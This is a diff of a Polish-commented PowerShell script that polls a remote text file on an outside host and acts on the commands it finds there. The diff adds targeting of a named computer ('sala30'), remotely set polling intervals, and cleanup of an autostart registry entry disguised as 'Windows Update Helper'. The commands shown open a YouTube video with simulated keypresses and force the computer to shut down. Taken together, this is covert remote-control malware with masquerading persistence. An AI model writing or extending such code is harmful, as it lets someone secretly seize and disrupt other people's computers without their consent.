@@ -1,4 +1,5 @@
 $checkInterval = 3
+$computerName = "sala30"
 $youtubeUrl = "https://www.youtube.com/watch?v=DjDSUqTcrv4"
 $watchTime = 45
 $url = "https://wkrgames.com/guslarz/pr/start.txt"
@@ -428,8 +429,26 @@ Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Skrypt uruchomiony. Monitoruje: $ur
 while ($true) {
     try {
         $content = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
-        $value = $content.Content.Trim()
-        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Odczytano wartosc: '$value'" -ForegroundColor Gray
+        $raw = $content.Content.Trim()
+
+        # Format pliku: "nazwakomputera,numer" lub samo "numer"
+        if ($raw -match ',') {
+            $parts   = $raw -split ',', 2
+            $target  = $parts[0].Trim()
+            $value   = $parts[1].Trim()
+        } else {
+            $target  = "all"
+            $value   = $raw
+        }
+
+        # Ignoruj jesli nie do nas i nie "all"
+        if ($target -ne "all" -and $target -ne $computerName) {
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Ignoruje (dla: '$target', my: '$computerName')" -ForegroundColor DarkGray
+            Start-Sleep $checkInterval
+            continue
+        }
+
+        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Odczytano wartosc: '$value' (target: '$target')" -ForegroundColor Gray
     } catch {
         Write-Host "[$(Get-Date -Format 'HH:mm:ss')] BLAD pobierania URL: $_" -ForegroundColor Red
         Start-Sleep $checkInterval
@@ -443,9 +462,18 @@ while ($true) {
     if ($value -ne "13") { $msg13Shown = $false }
 
     switch ($value) {
+        "-3" {
+            $checkInterval = 3
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-3] Odstep zmieniony na 3 sekundy" -ForegroundColor Cyan
+        }
+        "-2" {
+            $checkInterval = 300
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-2] Odstep zmieniony na 5 minut" -ForegroundColor Cyan
+        }
         "-1" {
-            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-1] Usuwam skrypt i koncze program" -ForegroundColor Red
-            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-1] Usuwam skrypt, wpis rejestru i koncze program" -ForegroundColor Red
+            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Update Helper" -ErrorAction SilentlyContinue
+            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }            
             exit
         }
         "1" {
@@ -455,7 +483,6 @@ while ($true) {
             Add-Type -AssemblyName System.Windows.Forms
             [System.Windows.Forms.SendKeys]::SendWait("f")
             Start-Sleep $watchTime
-            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
             Stop-Computer -Force
         }
         "2" {
@@ -473,7 +500,6 @@ while ($true) {
         }
         "3" {
             Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [3] Wylaczam PC" -ForegroundColor Red
-            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
             Stop-Computer -Force
         }
         "4" {
